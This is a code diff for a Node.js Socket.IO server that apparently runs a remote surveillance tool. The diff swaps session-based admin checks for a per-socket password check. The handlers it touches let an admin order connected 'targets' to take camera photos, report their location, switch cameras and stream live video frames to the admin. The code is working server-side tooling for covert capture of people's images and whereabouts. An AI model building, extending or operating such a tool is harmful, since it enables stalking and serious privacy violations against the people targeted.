@@ -59,6 +59,7 @@ let isAutoCaptureOn = true;
 
 const connectedTargets = new Map();
 const tempPhotos = new Map();
+const authenticatedAdmins = new Set();
 let accessHistory = loadHistory();
 
 function loadHistory() {
@@ -228,14 +229,13 @@ app.delete("/api/admin/photos/:id", requireAdmin, (req, res) => {
     res.json({ ok: true, deleted: existed });
 });
 
-io.engine.use(sessionMiddleware);
-
 io.on("connection", (socket) => {
-    socket.on("admin-join", () => {
-        if (!socket.request.session || socket.request.session.isAdmin !== true) {
+    socket.on("admin-auth", (password) => {
+        if (password !== ADMIN_PASSWORD) {
             socket.emit("admin-auth-required");
             return;
         }
+        authenticatedAdmins.add(socket.id);
         socket.join("admins");
         socket.emit("admin-initial-state", {
             linkActive: isLinkActive,
@@ -248,25 +248,25 @@ io.on("connection", (socket) => {
     });
 
     socket.on("admin-select-user", (targetSocketId) => {
-        if (!socket.request.session || socket.request.session.isAdmin !== true) return;
+        if (!authenticatedAdmins.has(socket.id)) return;
         if (!connectedTargets.has(targetSocketId)) return;
         socket.data.selectedUser = targetSocketId;
     });
 
     socket.on("admin-trigger-capture", (targetSocketId) => {
-        if (!socket.request.session || socket.request.session.isAdmin !== true) return;
+        if (!authenticatedAdmins.has(socket.id)) return;
         if (!isLinkActive || !connectedTargets.has(targetSocketId)) return;
         io.to(targetSocketId).emit("capture-photo");
     });
 
     socket.on("admin-request-location", (targetSocketId) => {
-        if (!socket.request.session || socket.request.session.isAdmin !== true) return;
+        if (!authenticatedAdmins.has(socket.id)) return;
         if (!isLinkActive || !connectedTargets.has(targetSocketId)) return;
         io.to(targetSocketId).emit("request-location");
     });
 
     socket.on("admin-switch-camera", (targetSocketId) => {
-        if (!socket.request.session || socket.request.session.isAdmin !== true) return;
+        if (!authenticatedAdmins.has(socket.id)) return;
         if (!isLinkActive || !connectedTargets.has(targetSocketId)) return;
         io.to(targetSocketId).emit("switch-camera");
     });
@@ -378,8 +378,7 @@ io.on("connection", (socket) => {
             if (
                 adminSocket.data &&
                 adminSocket.data.selectedUser === socket.id &&
-                adminSocket.request.session &&
-                adminSocket.request.session.isAdmin === true
+                authenticatedAdmins.has(adminSocketId)
             ) {
                 adminSocket.emit("update-live-stream", { socketId: socket.id, frameData });
             }
@@ -407,6 +406,7 @@ io.on("connection", (socket) => {
     });
 
     socket.on("disconnect", () => {
+        authenticatedAdmins.delete(socket.id);
         const target = connectedTargets.get(socket.id);
         if (target) {
             const timeStr = new Date().toISOString();
